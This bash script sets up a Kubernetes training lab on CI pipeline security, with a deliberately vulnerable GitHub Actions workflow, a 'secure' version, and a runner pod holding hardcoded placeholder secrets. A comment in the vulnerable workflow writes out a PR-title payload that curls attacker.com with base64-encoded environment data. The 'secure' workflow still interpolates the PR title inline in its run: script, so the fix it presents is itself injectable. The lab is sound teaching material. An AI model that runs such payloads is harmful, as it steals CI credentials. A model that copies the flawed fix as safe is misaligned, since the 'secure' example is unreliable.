#!/usr/bin/env bash
# Module 09 — DevSecOps Pipeline Security Lab
# ConfigMaps with vulnerable workflow files and a mock CI runner pod
set -euo pipefail

NS="dojo-lab-pipeline"

kubectl create namespace "$NS" --dry-run=client -o yaml | kubectl apply -f -

kubectl apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: vulnerable-workflow
  namespace: $NS
  labels:
    type: bad-example
data:
  ci.yml: |
    # BAD: vulnerable GitHub Actions workflow
    # Vulnerable to expression injection via PR title
    name: CI
    on:
      pull_request_target:
        types: [opened, synchronize]
    jobs:
      build:
        runs-on: ubuntu-latest
        permissions:
          contents: read
          id-token: write  # BAD: id-token write on pull_request_target
        steps:
        - uses: actions/checkout@v4
          with:
            ref: \${{ github.event.pull_request.head.sha }}  # BAD: checkout attacker's code

        # INJECTION VECTOR: pr_title is not sanitized
        - name: Set build label
          run: echo "Building PR: \${{ github.event.pull_request.title }}"
          # Attacker can set PR title to: `"; curl attacker.com/steal?token=$(cat /proc/self/environ | base64); echo "`

        - name: Build
          run: npm install && npm test

        - name: Deploy preview
          if: success()
          run: ./deploy-preview.sh
          env:
            AWS_ROLE: arn:aws:iam::123456789012:role/ci-deploy-role  # cloud creds available!
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: secure-workflow
  namespace: $NS
  labels:
    type: good-example
data:
  ci.yml: |
    # GOOD: fixed GitHub Actions workflow
    name: CI (Secure)
    on:
      pull_request:
        types: [opened, synchronize]
    jobs:
      build:
        runs-on: ubuntu-latest
        permissions:
          contents: read
          # NO id-token write — only grant what's needed
        steps:
        - uses: actions/checkout@v4
          # No ref override — checks out base branch code, not PR head

        # SAFE: use environment variable, not expression interpolation
        - name: Set build label
          run: |
            PR_TITLE="\${{ github.event.pull_request.title }}"
            echo "Building PR: \${PR_TITLE@Q}"  # @Q = shell-quote the variable
          env:
            PR_TITLE: \${{ github.event.pull_request.title }}
            # Pass via env, not inline in run: script

        - name: Build
          run: npm ci && npm test  # ci not install

        - name: Deploy preview (only from base repo)
          if: success() && github.event.pull_request.head.repo.full_name == github.repository
          run: ./deploy-preview.sh
          env:
            AWS_ROLE: \${{ secrets.AWS_DEPLOY_ROLE }}  # from org secrets
---
apiVersion: v1
kind: Pod
metadata:
  name: ci-runner
  namespace: $NS
  labels:
    app: ci-runner
spec:
  serviceAccountName: default
  containers:
  - name: runner
    image: alpine:3.20
    command: ["sh", "-c", "sleep 86400"]
    env:
    - name: CI
      value: "true"
    - name: GITHUB_TOKEN
      value: "ghp_EXAMPLE_INSECURE_HARDCODED_TOKEN_lab"
    - name: AWS_SECRET_ACCESS_KEY
      value: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    resources:
      limits:
        cpu: "100m"
        memory: "64Mi"
  restartPolicy: Always
EOF

echo "Pipeline security lab ready. Namespace: $NS"
echo ""
echo "Exercise: spot the injection vulnerability in vulnerable-workflow"
echo "  kubectl get configmap vulnerable-workflow -n $NS -o jsonpath='{.data.ci\\.yml}'"
echo ""
echo "Compare with the fixed version:"
echo "  kubectl get configmap secure-workflow -n $NS -o jsonpath='{.data.ci\\.yml}'"
echo ""
echo "Spot the CI runner with hardcoded secrets:"
echo "  kubectl exec ci-runner -n $NS -- env | grep -E 'TOKEN|KEY|SECRET'"
echo ""
echo "Key injection vectors to identify:"
echo "  1. pull_request_target + attacker code checkout"
echo "  2. github.event.pull_request.title in run: (not env:)"
echo "  3. id-token: write permission granted unnecessarily"
